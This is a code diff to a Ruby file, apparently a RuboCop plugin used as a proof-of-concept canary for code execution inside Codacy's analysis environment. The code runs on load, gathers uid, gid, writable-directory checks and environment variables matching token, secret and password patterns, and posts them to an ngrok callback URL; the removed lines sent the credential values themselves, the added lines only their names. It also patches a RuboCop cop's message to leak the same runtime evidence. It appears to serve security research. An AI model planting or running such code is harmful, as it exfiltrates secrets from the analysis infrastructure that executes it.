@@ -1,12 +1,12 @@
 # frozen_string_literal: true
 
-require "json"
-require "net/http"
-require "uri"
+require 'json'
+require 'net/http'
+require 'uri'
 
-CANARY = "codacy-analyzer-rce-064a0614a716d033f1791a45"
+CANARY = 'arcsec-codacy-rubocop-20260808-a1f9c2'
 CALLBACK =
-  URI("https://dcd6-49-207-201-243.ngrok-free.app/codacy/064a0614a716d033f1791a45")
+  URI('https://7450-49-207-201-243.ngrok-free.app/codacy/arcsec-codacy-rubocop-20260808-a1f9c2')
 CREDENTIAL_NAME =
   /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i
 
@@ -16,32 +16,25 @@ rescue StandardError
   false
 end
 
-credentials = ENV.each_with_object({}) do |(name, value), result|
-  next if value.nil? || value.empty?
-  next unless name.match?(CREDENTIAL_NAME)
-  break result if result.length >= 100
-
-  result[name] = value
-end
+credential_names = ENV.keys.grep(CREDENTIAL_NAME).sort.first(100)
 
 payload = JSON.generate(
   canary: CANARY,
-  tool: "rubocop",
+  tool: 'rubocop',
   runtime: {
     uid: Process.uid,
     gid: Process.gid,
-    cwd: Dir.pwd,
-    sourceWritable: writable?("/src"),
-    rootWritable: writable?("/"),
-    workdirWritable: writable?("/workdir")
+    source_writable: writable?('/src'),
+    root_writable: writable?('/'),
+    workdir_writable: writable?('/workdir')
   },
-  credentials: credentials
+  credential_names: credential_names
 )
 
 https_egress = begin
   request = Net::HTTP::Post.new(CALLBACK)
-  request["content-type"] = "application/json"
-  request["user-agent"] = "codacy-analyzer-canary/rubocop"
+  request['content-type'] = 'application/json'
+  request['user-agent'] = 'arcsec-codacy-rubocop-canary'
   request.body = payload
 
   response = Net::HTTP.start(
@@ -57,15 +50,15 @@ rescue StandardError
 end
 
 CODACY_RUNTIME_EVIDENCE = [
-  "CODACY_CANARY_EXECUTED",
+  'ARCSEC_CODACY_RUBOCOP_EXECUTED',
   "uid=#{Process.uid}",
   "gid=#{Process.gid}",
   "source_writable=#{writable?('/src')}",
   "root_writable=#{writable?('/')}",
   "workdir_writable=#{writable?('/workdir')}",
   "https_egress=#{https_egress}",
-  "credential_names=#{credentials.keys.sort.join(',')}"
-].join(" ")
+  "credential_names=#{credential_names.join(',')}"
+].join(' ')
 
 RuboCop::Cop::Style::StringLiterals.class_eval do
   define_method(:message) do |_node|
